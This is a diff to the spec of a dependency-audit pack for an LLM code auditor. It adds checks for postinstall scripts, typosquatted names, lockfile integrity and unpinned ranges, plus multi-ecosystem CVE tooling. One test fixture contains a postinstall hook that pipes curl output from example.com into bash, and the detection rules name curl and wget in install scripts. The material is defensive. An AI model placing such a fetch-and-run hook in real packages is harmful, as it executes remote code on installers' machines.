@@ -2,7 +2,7 @@
 
 ## Scope
 
-This pack audits npm dependency health for JavaScript and TypeScript repositories. It covers known CVE vulnerabilities, outdated packages (both minor and major), unused dependencies, and duplicate packages hoisted into the dependency tree. It relies on npm's built-in audit tooling and the knip unused-export analyser. It does NOT audit license compliance (covered by the tos-compliance pack), Python/Go/Rust dependency trees, or indirect peer-dependency conflicts beyond what npm audit reports.
+This pack audits dependency health across multiple ecosystems: npm (JavaScript/TypeScript), pip (Python), Cargo (Rust), and Bundler (Ruby). It covers known CVE vulnerabilities via tool-backed spine wrappers (dep-audit, pip-audit, cargo-audit, bundler-audit), plus supply-chain checks for postinstall lifecycle scripts, typosquatting, lockfile integrity, and unpinned version ranges. It also covers npm-specific outdatedness and dead-code cleanup (knip). It does NOT audit license compliance (covered by the tos-compliance pack), Go dependency trees (covered by govulncheck in the security pack), peer-dependency conflicts beyond what npm audit reports, or Python/Ruby/Rust outdatedness (those ecosystems lack a tool-backed auditor in this wave).
 
 **Pack ID:** `ccgm/dependencies`
 **Applies when:** `language:javascript`
@@ -13,7 +13,7 @@ This pack audits npm dependency health for JavaScript and TypeScript repositorie
 
 | Condition | Reason |
 |-----------|--------|
-| `language:javascript` | The ecosystem detector emits the `javascript` ecosystem for any repository that has a `package.json`; TypeScript repos additionally emit `typescript`. The registry derives condition tokens as `language:javascript` and `language:typescript` respectively. All checks target npm's package.json ecosystem; the dep-audit and knip spine tools require a package.json to function. Using `language:javascript` is the broadest honest gate: it covers both plain-JS and TypeScript projects (TS repos with a `package.json` satisfy both ecosystems). Wave 4.1 will broaden coverage to Python (pip-audit) and Go (govulncheck) under separate packs. |
+| `language:javascript` | The ecosystem detector emits the `javascript` ecosystem for any repository that has a `package.json`; TypeScript repos additionally emit `typescript`. The registry derives condition tokens as `language:javascript` and `language:typescript` respectively. All LLM and knip checks target npm's package.json ecosystem; the dep-audit spine tool requires a package.json to function. Using `language:javascript` is the broadest honest gate: it covers both plain-JS and TypeScript projects. Wave 4.1 extends vulnerability coverage to Python (pip-audit), Rust (cargo-audit), and Ruby (bundler-audit) as additional spine tools — their wrappers run when the relevant manifest is present regardless of the pack gate, but the pack's LLM and grep checks remain npm-scoped. |
 
 ---
 
@@ -55,6 +55,11 @@ findings with `check_id: deps/vulnerable-dependency` (rubric entry: high severit
 high fix_confidence). The LLM worker triages these spine candidates via `spine_triage`.
 The check-id `dependencies/npm-audit-vulnerability` is the pack's semantic label for this
 audit category. The spine emits `deps/vulnerable-dependency`, not `dependencies/npm-audit-vulnerability`.
+
+**Multi-ecosystem note:** `pip-audit`, `cargo-audit`, and `bundler-audit` also emit
+`deps/vulnerable-dependency` findings. When any of these tools is absent the wrapper emits a
+`coverage_gap` note with `tool: pip-audit` / `cargo-audit` / `bundler-audit`. The LLM worker
+should treat such gaps as a recommendation to install the missing tool rather than a false negative.
 
 #### Severity / Confidence
 
@@ -403,6 +408,380 @@ detection: llm
 
 ---
 
+### `dependencies/postinstall-script`
+
+**Severity:** `high`
+**Confidence:** `medium`
+**Detection:** `hybrid`
+
+#### Detection
+
+**Tool (if detection = tool or hybrid):**
+n/a — grep-based detection in the hybrid path; no dedicated spine tool
+
+Fallback when tool absent: `llm`
+
+**LLM instruction (if detection = llm or hybrid):**
+
+```
+READ AND APPLY: ~/.claude/skills/audit/reference/fix-patterns.md
+Consult the Fix Type Reference table and confidence levels from that file when classifying
+each finding's fix_type and fix_confidence. Do not rely on memory — open and apply the file.
+
+Scan the repository for lifecycle scripts that run arbitrary code during package installation.
+
+Step 1 — Project-level scripts:
+  Read package.json (and workspace package.json files if this is a monorepo).
+  Flag any of: "preinstall", "postinstall", "install", "preuninstall", "postuninstall"
+  keys in the "scripts" object. These execute during npm install / npm uninstall for anyone
+  who installs this package, and are a common supply-chain attack vector.
+
+Step 2 — Third-party dependency scripts:
+  Grep for '"postinstall"', '"preinstall"', '"install"' keys in files matching
+  node_modules/*/package.json. For each hit, record the package name and script value.
+  Flag packages whose script invokes a network call (curl, wget, fetch, https://),
+  spawns a shell with untrusted input, or runs a compiled binary from an unusual path.
+
+For each finding:
+  - path: the package.json file containing the lifecycle script
+  - message: the package name, script key, and first 80 chars of the script value
+  - auto_fixable: false (removal requires verifying the script's purpose)
+
+Do NOT flag:
+  - Scripts that only invoke standard build tools (node, tsc, esbuild, rollup, webpack,
+    babel, rimraf) with static arguments
+  - Scripts from well-known, widely-audited packages (e.g. esbuild, turbo, node-gyp
+    when building native extensions explicitly listed in the project's purpose)
+  - husky or other developer-only lifecycle hooks that are clearly dev-only
+```
+
+#### Spine Wiring
+
+```yaml
+check_id: dependencies/postinstall-script
+detection: hybrid
+fallback: llm
+```
+
+No dedicated spine tool — grep pattern matching + LLM triage for the hybrid path.
+
+#### Severity / Confidence
+
+**Severity rationale:** Postinstall scripts are a documented vector for npm supply-chain attacks (malicious packages executing code during `npm install`). HIGH severity because an exploited postinstall runs in the developer's environment with full shell access. A finding warrants manual review even when the script appears benign.
+
+**Confidence rationale:** Detection is syntactic (presence of lifecycle script key) rather than semantic (analysis of what the script does). Whether the script is malicious requires human judgment; many legitimate packages use postinstall for native compilation. MEDIUM confidence because syntactic presence is reliable but impact assessment is not.
+
+**Rubric entry:** `dependencies/postinstall-script`
+
+#### Fixture
+
+**True positive** (`package.json` with suspicious postinstall):
+
+```json
+{
+  "name": "my-app",
+  "scripts": {
+    "postinstall": "curl https://example.com/setup.sh | bash"
+  }
+}
+```
+*(Postinstall fetches and executes remote code — finding reported)*
+
+**True negative** (should produce NO finding):
+
+```json
+{
+  "name": "my-app",
+  "scripts": {
+    "build": "tsc --project tsconfig.json",
+    "test": "jest"
+  }
+}
+```
+*(No lifecycle installation scripts — no finding)*
+
+---
+
+### `dependencies/typosquat`
+
+**Severity:** `high`
+**Confidence:** `low`
+**Detection:** `llm`
+
+#### Detection
+
+**LLM instruction (if detection = llm or hybrid):**
+
+```
+READ AND APPLY: ~/.claude/skills/audit/reference/fix-patterns.md
+Consult the Fix Type Reference table and confidence levels from that file when classifying
+each finding's fix_type and fix_confidence. Do not rely on memory — open and apply the file.
+
+Scan the project's dependency manifests for package names that are suspiciously similar to
+well-known, popular packages — a classic typosquatting vector.
+
+Step 1 — Collect all dependency names:
+  Read package.json (dependencies, devDependencies, peerDependencies, optionalDependencies).
+  If a requirements.txt or Gemfile is present, also collect their dependency names.
+
+Step 2 — Check each name against known typosquatting patterns:
+  Flag a dependency name if it:
+    (a) Is one character away (addition, deletion, substitution, transposition) from a
+        well-known package (e.g. "lodahs" for "lodash", "recat" for "react",
+        "expresss" for "express", "axois" for "axios", "momentjs" for "moment",
+        "babbel" for "babel", "typescirpt" for "typescript").
+    (b) Replaces a hyphen with nothing or a number (e.g. "crossenv" for "cross-env",
+        "dotenv2" for "dotenv").
+    (c) Prepends or appends common confusing words ("node-", "the-", "-js", "-official")
+        to a well-known package name where those affixes are NOT part of the canonical name.
+    (d) Swaps a namespace prefix (e.g. "@babel/core" vs "babel-core" in contexts where
+        the namespaced version is the canonical one).
+
+For each suspicious dependency:
+  - path: the manifest file (package.json, requirements.txt, Gemfile)
+  - message: the suspicious name, the well-known name it resembles, and the edit distance
+  - auto_fixable: false (requires verifying intent and potentially updating imports)
+
+Do NOT flag:
+  - Packages that are genuinely distinct from their lookalikes in a well-documented way
+  - Packages that are explicitly scoped aliases ("lodash-es", "lodash-fp", "date-fns/esm")
+    where the affix is part of the package's published purpose
+  - Packages you cannot confidently associate with a popular counterpart
+    (prefer false negatives over false positives for this check)
+```
+
+#### Spine Wiring
+
+```yaml
+check_id: dependencies/typosquat
+detection: llm
+```
+
+No tool — LLM-only check. The LLM reasons about edit distance and naming conventions.
+
+#### Severity / Confidence
+
+**Severity rationale:** Typosquatted packages can install malware, steal credentials, or exfiltrate environment variables on any machine running `npm install` or `pip install`. HIGH severity because the impact of an exploited typosquat ranges from data exfiltration to full system compromise.
+
+**Confidence rationale:** LLM-based edit-distance reasoning is inherently imprecise — the set of "popular packages" is not exhaustive, and many legitimate packages have names that are one character from a popular one. LOW confidence because false positives are frequent; this check is a screening aid, not a definitive detector. Findings require human confirmation.
+
+**Rubric entry:** `dependencies/typosquat`
+
+#### Fixture
+
+**True positive** (`package.json` with typosquatted dep):
+
+```json
+{
+  "dependencies": {
+    "lodahs": "4.17.21"
+  }
+}
+```
+*(One-character transposition of "lodash" — suspicious name)*
+
+**True negative** (should produce NO finding):
+
+```json
+{
+  "dependencies": {
+    "lodash": "4.17.21",
+    "lodash-es": "4.17.21"
+  }
+}
+```
+*("lodash-es" is the canonical ESM build of lodash, not a typosquat)*
+
+---
+
+### `dependencies/lockfile-integrity`
+
+**Severity:** `high`
+**Confidence:** `medium`
+**Detection:** `hybrid`
+
+#### Detection
+
+**Tool (if detection = tool or hybrid):**
+n/a — grep-based detection; no dedicated spine tool
+
+Fallback when tool absent: `llm`
+
+**LLM instruction (if detection = llm or hybrid):**
+
+```
+READ AND APPLY: ~/.claude/skills/audit/reference/fix-patterns.md
+Consult the Fix Type Reference table and confidence levels from that file when classifying
+each finding's fix_type and fix_confidence. Do not rely on memory — open and apply the file.
+
+Check the repository's dependency lockfile for integrity issues.
+
+Check 1 — Lockfile missing:
+  If package.json exists but NO lockfile (package-lock.json, yarn.lock, pnpm-lock.yaml,
+  bun.lockb, Pipfile.lock, poetry.lock, Cargo.lock, Gemfile.lock) is present in the same
+  directory, report a missing lockfile. A missing lockfile means installs are non-deterministic
+  and dependency versions are not pinned.
+
+Check 2 — Lockfile out of sync:
+  If package.json and package-lock.json (or yarn.lock / pnpm-lock.yaml) both exist,
+  check for signs of divergence:
+    (a) A dependency listed in package.json that has NO entry in the lockfile.
+    (b) A dependency in the lockfile at a version OUTSIDE the semver range declared in
+        package.json (e.g. lockfile pins 5.0.0 but package.json requires "^6.0.0").
+  Both conditions indicate the lockfile was not regenerated after editing package.json.
+
+For each finding:
+  - path: package.json (for missing lockfile) or the lockfile path (for sync issues)
+  - message: which manifest, what is missing or diverged, and the fix command
+  - auto_fixable: false (regenerating a lockfile can change resolved versions)
+
+Do NOT flag:
+  - Repositories that intentionally omit a lockfile (e.g. published libraries where
+    package.json specifies only peer dependency ranges and no lockfile is conventional)
+  - Monorepo workspaces that share a single root-level lockfile
+```
+
+#### Spine Wiring
+
+```yaml
+check_id: dependencies/lockfile-integrity
+detection: hybrid
+fallback: llm
+```
+
+No dedicated spine tool — the hybrid path uses file-existence checks + LLM comparison.
+
+#### Severity / Confidence
+
+**Severity rationale:** A missing or out-of-sync lockfile means CI and developer machines can install different package versions, making the build non-reproducible and potentially allowing a malicious package version to be resolved at install time. HIGH severity because reproducibility failures directly enable supply-chain drift.
+
+**Confidence rationale:** Lockfile presence is a deterministic check. Sync divergence requires comparing version ranges across two files, which the LLM can perform with moderate accuracy; subtle range edge cases may be missed. MEDIUM confidence.
+
+**Rubric entry:** `dependencies/lockfile-integrity`
+
+#### Fixture
+
+**True positive** (package.json present, no lockfile):
+
+```
+package.json      ← exists
+(no package-lock.json, yarn.lock, pnpm-lock.yaml)
+```
+*(Lockfile absent — non-deterministic installs)*
+
+**True negative** (should produce NO finding):
+
+```
+package.json          ← exists
+package-lock.json     ← exists, versions in sync
+```
+*(Both files present and in sync — no finding)*
+
+---
+
+### `dependencies/unpinned-version-range`
+
+**Severity:** `medium`
+**Confidence:** `high`
+**Detection:** `hybrid`
+
+#### Detection
+
+**Tool (if detection = tool or hybrid):**
+n/a — grep-based detection; no dedicated spine tool
+
+Fallback when tool absent: `llm`
+
+**LLM instruction (if detection = llm or hybrid):**
+
+```
+READ AND APPLY: ~/.claude/skills/audit/reference/fix-patterns.md
+Consult the Fix Type Reference table and confidence levels from that file when classifying
+each finding's fix_type and fix_confidence. Do not rely on memory — open and apply the file.
+
+Scan dependency manifests for version specifiers that allow a range of versions to be
+resolved at install time. Focus on production dependencies of sensitive packages.
+
+Step 1 — Collect manifests:
+  Read: package.json (dependencies, devDependencies, peerDependencies),
+        requirements.txt or pyproject.toml (Python),
+        Gemfile (Ruby — look for gem directives without a `:require => false` or version pin).
+
+Step 2 — Flag unpinned specifiers in sensitive contexts:
+  Flag a dependency entry if:
+    (a) package.json: dependency uses ^, ~, >=, >, *, or "latest" as the version specifier,
+        AND the package is a production dependency (not devDependencies) that handles
+        authentication, cryptography, HTTP requests, database access, or serialization.
+        Examples of sensitive categories: axios, got, node-fetch, bcrypt, jsonwebtoken,
+        passport, sequelize, mongoose, pg, prisma, multer, formidable, serialize-javascript.
+    (b) requirements.txt: dependency uses >= or no version pin at all (bare package name),
+        AND the package is a network, crypto, or serialization library (requests, pycryptodome,
+        cryptography, paramiko, sqlalchemy, flask, django).
+    (c) Gemfile: dependency uses no version constraint or only a ~> (pessimistic) constraint
+        that allows minor-or-patch upgrades on a cryptography or network gem (openssl, net-http,
+        faraday, httparty, rack, rails).
+
+  Do NOT flag:
+    - devDependencies with caret ranges (standard and acceptable for build tooling)
+    - Packages that are clearly not security-sensitive (date formatters, UI utilities, test helpers)
+    - peerDependencies (ranges are the norm for peer deps)
+    - Version specifiers that are already exact (e.g. "1.2.3", "==1.2.3", "= 1.2.3")
+    - Internal workspace packages ("workspace:*" or "file:../")
+
+For each finding:
+  - path: the manifest file
+  - message: the package name, the current specifier, and why the range is sensitive
+  - auto_fixable: false — pinning requires running the install and committing the exact version
+```
+
+#### Spine Wiring
+
+```yaml
+check_id: dependencies/unpinned-version-range
+detection: hybrid
+fallback: llm
+```
+
+No dedicated spine tool — grep for `^`, `~`, `>=`, `*` in manifest files + LLM triage for sensitivity.
+
+#### Severity / Confidence
+
+**Severity rationale:** Unpinned ranges on security-sensitive packages allow a compromised patch release to be silently pulled in on the next `npm install` or `pip install`. MEDIUM severity because the risk materializes only if the upstream package is itself compromised; for most projects the likelihood is low but the impact is high.
+
+**Confidence rationale:** Detecting range syntax in a manifest is deterministic and reliable — the grep or LLM can read the version string exactly. Determining whether a package is "sensitive" requires LLM judgment, which is imperfect but generally accurate for well-known ecosystem packages. HIGH confidence overall.
+
+**Rubric entry:** `dependencies/unpinned-version-range`
+
+#### Fixture
+
+**True positive** (`package.json` with unpinned production dep):
+
+```json
+{
+  "dependencies": {
+    "jsonwebtoken": "^9.0.0",
+    "axios": "*"
+  }
+}
+```
+*(jsonwebtoken with caret range and axios with wildcard — both security-sensitive, both unpinned)*
+
+**True negative** (should produce NO finding):
+
+```json
+{
+  "dependencies": {
+    "jsonwebtoken": "9.0.2"
+  },
+  "devDependencies": {
+    "jest": "^29.0.0"
+  }
+}
+```
+*(jsonwebtoken is exactly pinned; jest caret range is devDependency — no finding)*
+
+---
+
 ## Migration Mapping
 
 Every bullet from the original Agent 2 Dependencies Audit category prompt is mapped to its owning check-id:
@@ -415,7 +794,22 @@ Every bullet from the original Agent 2 Dependencies Audit category prompt is map
 | Unused dependencies (auto-fixable: npm uninstall) | `dependencies/unused-dependency` |
 | Duplicate dependencies (NOT auto-fixable - needs investigation) | `dependencies/duplicate-dependency` |
 
-All 5 original bullets are covered. No bullet dropped. The original `Run: npm audit --json, npm outdated --json` instruction is preserved in the individual check LLM instructions.
+Wave 4.1 additions:
+
+| New check | Motivation |
+|-----------|-----------|
+| `dependencies/postinstall-script` | Supply-chain: lifecycle scripts that execute arbitrary code at install time |
+| `dependencies/typosquat` | Supply-chain: package names one edit away from popular packages |
+| `dependencies/lockfile-integrity` | Supply-chain: missing or out-of-sync lockfile allows non-deterministic installs |
+| `dependencies/unpinned-version-range` | Supply-chain: caret/tilde/wildcard ranges on security-sensitive production deps |
+
+Multi-ecosystem vulnerability coverage (Wave 4.1) via new spine tools:
+
+| Ecosystem | Tool | Spine check-id | Absent-tool behavior |
+|-----------|------|----------------|----------------------|
+| Python | pip-audit | `deps/vulnerable-dependency` | `coverage_gap` + LLM fallback note |
+| Rust | cargo-audit | `deps/vulnerable-dependency` | `coverage_gap` + LLM fallback note |
+| Ruby | bundler-audit | `deps/vulnerable-dependency` | `coverage_gap` + LLM fallback note |
 
 ---
 
